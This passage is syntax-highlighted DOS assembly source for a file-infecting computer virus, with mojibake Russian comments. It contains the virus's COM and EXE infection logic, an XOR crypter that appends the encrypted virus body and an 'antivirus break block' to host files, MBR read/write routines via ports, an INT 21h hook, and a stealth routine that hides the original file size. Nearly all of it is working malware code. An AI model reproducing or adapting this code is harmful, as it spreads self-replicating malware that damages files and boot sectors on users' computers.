</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ COM ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;1-COM file</span><span class="sc0">
        </span><span class="sc1">;®¬¥â¨¬ çâ® íâ® COM ä ©« (­ã¦­®)!</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc5">file_align</span><span class="sc4">+</span><span class="sc2">300h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0"> </span><span class="sc1">;” ©«ë ¬¥­ìè¥ íâ®£® p §¬¥p  ­¥ § p ¦ ¥¬</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_file_align</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0e9h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc1">;¨è¥¬ BREAK BLOCK ¨ § ­¨¬ § è¨äp®¢ ­­ë© ¢¨pãá</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
</span><span class="sc5">write_new20_and_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
</span><span class="sc5">infect_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ EXE ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;H  ¢å®¤¥ ¬ë ¨¬¥¥¬:</span><span class="sc0">
</span><span class="sc1">;BX = OLD_BUFFER</span><span class="sc0">
</span><span class="sc1">;DS=ES = CS</span><span class="sc0">
</span><span class="sc1">;ãä¥p OLD § ¯®«­¥­ 20h ¡ ©â ¬¨ ¨§ ­ ç «  ä ©« </span><span class="sc0">
</span><span class="sc5">go_infec_exe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">;EXE FILE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;„«¨­­  ®¡p §  ¢ 512-¨ ¡ ©â®¢ëå áâp ­¨æ å</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc1">;” ©« ­¥ á®¤¥p¦¨â ®¢¥p«¥¨</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;„«¨­­  § £®«®¢ª  ¢ ¯ p £p ä å</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc1">;DI - ¤«¨­­  § £®«®¢ª </span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_file_align</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc1">;DX:AX - ¤«¨­­  ä ©«  ¡¥§ § £®«®¢ª </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Relo CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;IP</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc5">length_of_antivirus_break_block</span><span class="sc4">+</span><span class="sc2">300h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Relo SS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;Sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Œ¨­¨¬ã¬ âp¥¡ã¥¬®© ¯ ¬ïâ¨ §  ª®­æ®¬ ¯p®£p ¬¬ë</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">min_mem_above_then_30</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">min_mem_above_then_30</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">max_mem_above_then_30</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Œ ªá¨¬ã¬ âp¥¡ã¥¬®© ¯ ¬ïâ¨ §  ª®­æ®¬ ¯p®£p ¬¬ë</span><span class="sc0">
</span><span class="sc5">max_mem_above_then_30</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;¨è¥¬:</span><span class="sc0">
        </span><span class="sc1">;1) BREAK BLOCK</span><span class="sc0">
        </span><span class="sc1">;2) ‡ è¨äp®¢ ­­ë© ¢¨pãá</span><span class="sc0">
        </span><span class="sc1">;3) p¨£¨­ «ì­ë¥ ¤ ­­ë¥</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0"> </span><span class="sc1">;‚ëå®¤: DX:AX - ­  ª®­æ¥</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">size_multiple_200</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">size_multiple_200</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">write_new20_and_end</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß CRYPTER ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc5">crypt_virus_and_write_to_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc1">;„«ï ­ ç «  á£¥­¥p¨pã¥¬ á«ãç ©­®¥ ç¨á«®</span><span class="sc0">
</span><span class="sc5">new_random_crypt_number</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">random_any_ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">new_random_crypt_number</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">crypt_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc1">;¥p¥­®á¨¬ ¢¨pãá</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">length_of_virus_in_bate</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc1">;˜¨äpã¥¬ ¢¨pãá</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_crypt</span><span class="sc4">-</span><span class="sc5">begin_crypt</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc5">begin_crypt</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">crypt_virus_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">crypt_virus_loop</span><span class="sc0">
        </span><span class="sc1">;‡ ¯¨è¥¬ ANTI_VIRUS_BREAK_BLOCK</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">length_of_antivirus_break_block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">antivirus_break_block</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc1">;¨è¥¬ á ¬ ¢¨pãá</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">length_of_virus_in_bate</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">next_write_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">next_write_block</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">exit_stc_crypt_virus_and_write_to_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_original_size</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßßßßßß ®¤¯p®£p ¬¬ë ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc5">write_MBR_call</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_MBR_via_port</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">read_MBR_call</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_MBR_via_port</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;®¤¯p®£p ¬¬  ®¡p ¡®âª¨ 21-£® ¯p¥pë¢ ­¨ï á ®¯¨á â¥«¥¬ ä ©« </span><span class="sc0">
</span><span class="sc5">call_int21_with_use_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc5">place_of_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;®¤¯p®£p ¬¬  ®¡p ¡®âª¨ 21-£® ¯p¥pë¢ ­¨ï.</span><span class="sc0">
</span><span class="sc5">call_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">09ah</span><span class="sc0">      </span><span class="sc1">;CALL XXXX:XXXX</span><span class="sc0">
</span><span class="sc5">place_of_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">return_original_size_of_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">asciiz</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D00h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">length_of_original_file_info</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_q_file_infected</span><span class="sc0">
